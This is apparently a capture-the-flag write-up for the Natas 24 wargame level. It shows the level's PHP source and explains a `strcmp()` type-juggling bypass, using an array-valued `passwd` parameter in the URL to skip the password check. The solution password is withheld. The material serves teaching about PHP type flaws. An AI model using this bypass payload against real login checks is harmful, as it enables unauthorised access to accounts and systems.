# Natas24
#natas #php #type-juggling #strcmp
## Vulnerability:
The application expects the `passwd` parameter to be a string and compares it with the correct password using `strcmp()`. However, it does not validate the type of the user-supplied input.
## Technique:
Provided `passwd` as an array instead of a string, which made `strcmp()` behaves unexpectedly. The PHP version used by the challenge caused the function return a falsy value. Because the result is negated with `!`, the condition becomes true, allowing the password check to be bypassed.
**Source Code:**
```php
<?php
if (array_key_exists("passwd", $_REQUEST)) {
    if (!strcmp($_REQUEST["passwd"], "<censored>")) {
        echo "<br>The credentials for the next level are:<br>";
        echo "<pre>Username: natas25 Password: <censored></pre>";
    } else {
        echo "<br>Wrong!<br>";
    }
}
// morla / 10111
?>
```
**URL:**
```
http://natas24.natas.labs.overthewire.org/?passwd[]=anything
```
**Result:**

<img width="1316" height="653" alt="image" src="https://github.com/user-attachments/assets/106789ea-71da-4614-9bb0-cf51f76bfd64" />

## Password found:
[Not disclosed — solve it yourself!]
## Previous Level:
[Natas23](./Natas23.md)
## Next Level:
[Natas25](./Natas25.md)
